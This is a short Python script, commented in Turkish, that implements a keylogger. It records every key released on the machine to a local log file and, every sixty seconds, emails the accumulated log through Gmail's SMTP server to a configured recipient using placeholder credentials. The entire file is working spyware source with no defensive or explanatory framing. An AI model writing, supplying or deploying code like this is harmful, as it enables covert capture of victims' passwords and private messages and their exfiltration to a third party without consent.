import keyboard
import smtplib
from threading import Timer
from email.mime.text import MIMEText

# Kayıt dosyası adı
LOG_FILE = "log.txt"

# E-posta bilgileri
EMAIL_ADDRESS = "your_email_address@gmail.com"
EMAIL_PASSWORD = "your_email_password"
SEND_TO_EMAIL = "send_to_email_address@gmail.com"
EMAIL_INTERVAL = 60  # Saniye cinsinden

# Klavye tuşlarını kaydetme fonksiyonu
def keylogger(e):
    # Kayıt dosyasını açma
    with open(LOG_FILE, "a") as f:
        # Klavyeden basılan tuşu alıp dosyaya yazma
        key = e.name
        f.write(key + "\n")

# E-posta gönderme fonksiyonu
def send_email():
    # Kayıt dosyasını okuma
    with open(LOG_FILE, "r") as f:
        data = f.read()

    # E-posta içeriğini oluşturma
    msg = MIMEText(data)
    msg["Subject"] = "Keylogger Data"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = SEND_TO_EMAIL

    # E-posta sunucusuna bağlanma ve e-postayı gönderme
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, SEND_TO_EMAIL, msg.as_string())
    server.quit()

# Zamanlayıcı fonksiyonu
def timer():
    # Belirli aralıklarla e-posta gönderme
    Timer(EMAIL_INTERVAL, timer).start()
    send_email()

# Programı başlatma
timer()
keyboard.on_release(keylogger)
keyboard.wait()
